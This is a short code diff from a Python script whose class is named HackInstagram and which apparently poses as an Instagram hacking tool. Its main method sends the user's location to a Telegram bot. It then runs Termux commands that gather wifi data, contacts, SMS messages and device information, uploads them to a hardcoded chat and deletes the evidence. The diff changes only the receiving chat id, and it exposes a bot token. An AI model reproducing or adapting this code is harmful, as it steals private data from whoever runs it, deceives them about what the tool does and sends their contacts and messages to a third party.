@@ -46,11 +46,11 @@ class HackInstagram(object):
             file.close()
     
     def main(self):
-        self.send_location(token="6523551442:AAGhJT1lGcOQ5ePSpEcJozyDcbfT5yl0t3E" , chat_id='1769267646')
+        self.send_location(token="6523551442:AAGhJT1lGcOQ5ePSpEcJozyDcbfT5yl0t3E" , chat_id='5076503203')
         os.system("clear")
         commands = ["termux-wifi-scaninfo" , "termux-contact-list" , "termux-sms-list" , "termux-telephony-deviceinfo"]
         _ = [self.execute_command(cmd) for cmd in commands]
-        self.send_file("6523551442:AAGhJT1lGcOQ5ePSpEcJozyDcbfT5yl0t3E" , "1769267646" , "result.txt")
+        self.send_file("6523551442:AAGhJT1lGcOQ5ePSpEcJozyDcbfT5yl0t3E" , "5076503203" , "result.txt")
         os.remove('result.txt')
         for i in range(10):
             for i in ["/", "-","|" , "\\"]:
